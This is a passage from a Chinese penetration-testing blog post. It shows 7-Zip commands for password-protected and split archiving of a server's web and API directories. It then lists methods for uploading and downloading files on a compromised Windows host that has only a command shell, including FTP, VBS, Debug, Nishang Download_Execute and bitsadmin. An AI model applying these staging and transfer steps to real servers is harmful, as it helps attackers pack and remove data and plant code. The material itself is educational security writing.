+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7z.exe a -r -p12345 E:\webs\1.7z E:\webs</span><br></pre></td></tr></table></figure>
+
+<p>把已经打包的<code>E:\webs\1.7z</code>文件解压到<code>E:\x</code>目录下，命令如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7z.exe X -p12345 E:\webs\1.7z -OE:\X</span><br></pre></td></tr></table></figure>
+
+<p><strong>2.分卷压缩/解压方式</strong></p>
+<p>分卷压缩E盘API目录下的所有文件及文件夹（使用-r参数进行递归压缩），指定压缩密码“admin”，每个分卷为20MB,结构为test.7z.001、test.7z.002、test.7z.003命令如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7z.exe -r -vlm -padmin a E:\test.7z E:\API</span><br></pre></td></tr></table></figure>
+
+<p>将E:\test.7z.001解压到E盘的xl目录下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7z.exe x -padmin E:\test.7z.001 -oE:\xl</span><br></pre></td></tr></table></figure>
+
+<h4 id="0x04-上传和下载"><a href="#0x04-上传和下载" class="headerlink" title="0x04 上传和下载"></a>0x04 上传和下载</h4><p>对于不能上传shell,但是可以执行命令的Windows服务器（而且是唯一的入口就是命令行环境），可以在shell命令行环境中对目标环境服务器进行上传和下载的操作</p>
+<p>常用的方式如下：</p>
+<ul>
+<li>利用FTP协议上传</li>
+<li>利用VBS上传</li>
+<li>利用Debug上传</li>
+<li>利用Nishang上传（Download_Execute下载执行脚本）</li>
+<li>利用bitsadmin下载</li>
+</ul>
+<p>参考链接</p>
+<p><a href="https://www.cnblogs.com/oneWhite/p/11169704.html" target="_blank" rel="noopener">https://www.cnblogs.com/oneWhite/p/11169704.html</a></p>
+<p><a href="https://xz.aliyun.com/t/7245" target="_blank" rel="noopener">https://xz.aliyun.com/t/7245</a></p>
+<p><a href="https://www.tuicool.com/articles/JNRn6nY" target="_blank" rel="noopener">https://www.tuicool.com/articles/JNRn6nY</a></p>
+</div><!--文章标签--><div class="tags"></div><!--评论--></div></div></div><div class="pure-u-1-4"><div id="sidebar"><div class="widget"><form action="//www.google.com/search" method="get" accept-charset="utf-8" id="search" target="_blank" class="search-form"><input type="text" name="q" maxlength="20" placeholder="Search"><input type="hidden" name="sitesearch" value="http://yoursite.com"></form></div><div class="widget"><div class="widget-title"> 分类</div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/python/">python</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/内网渗透/">内网渗透</a><span class="category-list-count">15</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/复现/">复现</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂记/">杂记</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透/">渗透</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/靶机/">靶机</a><span class="category-list-count">1</span></li></ul></div><div class="widget"><div class="widget-title"> 标签</div><div class="tagcloud"><a href="/tags/metasploit/" style="font-size: 16px;">metasploit</a> <a href="/tags/代码执行/" style="font-size: 12px;">代码执行</a> <a href="/tags/权限提升/" style="font-size: 12px;">权限提升</a> <a href="/tags/文件读取/" style="font-size: 12px;">文件读取</a> <a href="/tags/Cobalt-Strike/" style="font-size: 12px;">Cobalt Strike</a> <a href="/tags/安全开发/" style="font-size: 12px;">安全开发</a> <a href="/tags/Ngrok/" style="font-size: 12px;">Ngrok</a> <a href="/tags/文件包含/" style="font-size: 12px;">文件包含</a> <a href="/tags/PowerShell/" style="font-size: 18px;">PowerShell</a> <a href="/tags/QCOW2/" style="font-size: 12px;">QCOW2</a> <a href="/tags/Vulnhub/" style="font-size: 12px;">Vulnhub</a> <a href="/tags/远程代码执行/" style="font-size: 16px;">远程代码执行</a> <a href="/tags/命令执行/" style="font-size: 12px;">命令执行</a> <a href="/tags/shell脚本/" style="font-size: 12px;">shell脚本</a> <a href="/tags/免杀/" style="font-size: 16px;">免杀</a> <a href="/tags/文件上传/" style="font-size: 12px;">文件上传</a> <a href="/tags/Covenant/" style="font-size: 12px;">Covenant</a> <a href="/tags/meterpreter/" style="font-size: 12px;">meterpreter</a> <a href="/tags/poc/" style="font-size: 12px;">poc</a> <a href="/tags/msfvenom/" style="font-size: 12px;">msfvenom</a> <a href="/tags/域信息收集/" style="font-size: 14px;">域信息收集</a> <a href="/tags/反序列化/" style="font-size: 12px;">反序列化</a></div></div><div class="widget"><div class="widget-title"> 最新文章</div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/04/26/隐藏通信隧道技术二/">隐藏通信隧道技术二</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/22/隐藏通信隧道技术/">隐藏通信隧道技术</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/18/Mac配置PyQt5-pyCharm并使用/">Mac配置PyQt5+pyCharm并使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/14/Covenant/">Covenant</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/10/CVE-2020-10560-OSSN任意文件读取漏洞复现/">CVE-2020-10560-OSSN任意文件读取漏洞复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/08/PowerShell-Nishang/">PowerShell-Nishang</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/04/PowerShell-PowerSploit/">PowerShell-PowerSploit</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/01/SMBv3-1-1-CVE-2020-0796/">SMBv3.1.1_CVE-2020-0796</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/31/内网信息收集二/">内网信息收集二</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/03/30/内网信息收集一/">内网信息收集一</a></li></ul></div><div class="widget"><div class="widget-title"> 友情链接</div><ul class="links-list"><li class="links-list-item"><a href="https://timeshu.github.io/" title="Time" target="_blank">Time</a></li></ul><ul class="links-list"><li class="links-list-item"><a href="http://blog.leanote.com/snowming" title="Snowming" target="_blank">Snowming</a></li></ul></div></div></div></div><div id="footer">© <a href="/." rel="nofollow">Guko's Blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a> Theme<a target="_blank" href="https://github.com/7ye/maupassant-hexo"> Maupassant.</a></div><a id="back_to_top" href="javascript:void(0)" class="back_to_top"><span>△</span></a><script type="text/javascript" src="/js/totop.js?v=0.0.1"></script><link rel="stylesheet" href="/css/jquery.fancybox.css"><script type="text/javascript" src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js"></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1"></script><script>function auto_code_fit(){
+  if($(".highlight").length != 0){
+    var pc_width = $(".post-content").width();
+    $(".highlight .code").find("pre").width((pc_width-70)+"px");
+  }
+}
+window.onresize = function(){
+  auto_code_fit();
+}
+auto_code_fit();</script></div></body>
